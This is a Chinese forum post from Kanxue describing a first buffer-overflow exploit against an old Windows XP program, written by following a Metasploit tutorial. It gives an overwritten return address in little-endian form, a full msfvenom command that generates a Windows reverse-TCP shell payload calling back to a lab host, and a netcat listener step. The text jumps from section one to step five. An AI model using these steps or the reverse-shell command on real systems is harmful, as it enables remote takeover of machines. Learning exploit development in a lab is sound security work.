# [原创]编写第一个Exploit

## 前言

之前在看雪论坛中下载了一个文档《Exploit编写系列教程》。看了其中的第一篇，里面很详细的描述了怎么使用metasploit这个工具来编写exploit，但是在文章中找不到可以练手的软件，于是去exploit-db网站找了一个比较老的软件。按照教程的方法，写了一个。比较简单，没什么技术性。大牛勿喷。
可以看看论坛的教程比较详细：https://bbs.pediy.com/thread-101365.htm

ps：链接中附加了漏洞的软件，以及ImmunityDebugger的mona插件。

## 一、 编写Exploit使用的工具、环境

使用的工具有Metasploit、ImmunityDebugger。其中Metasploit直接下载一个kali就可以了。软件的安装环境是WinXpSP3。

5.记下内存的地址：7D5A30D7。去脚本中将EIP的值改为该地址，但是在Windows下面有个大小端的问题，因此，在脚本中需要改一下“\xD7\x30\x5A\x7D”

使用metasploit生成一个反弹的shell。

指令：msfvenom -p windows/shell\_reverse\_tcp LHOST=192.168.189.131 LPORT=8999 -b “\x00\x0d\x0a\x40\x20” -f python

其中windows/shell\_reverse\_tcp 是metasploit的一个反弹shell的功能，LHOST表示要反弹的目标主机，PORT目标主机端口，b参数表示生成的代码要去除一些bad words。0a、0d等等是回车换行的十六进制，因此需要去除，防止代码执行错误。

![](https://bbs.kanxue.com/upload/attach/201805/592776_DZ2UBE4U2XFFYUS.png)

将metasploit生成的代码拷贝下来放入Python脚本中，并且在目标主机中使用nc进行监听端口。
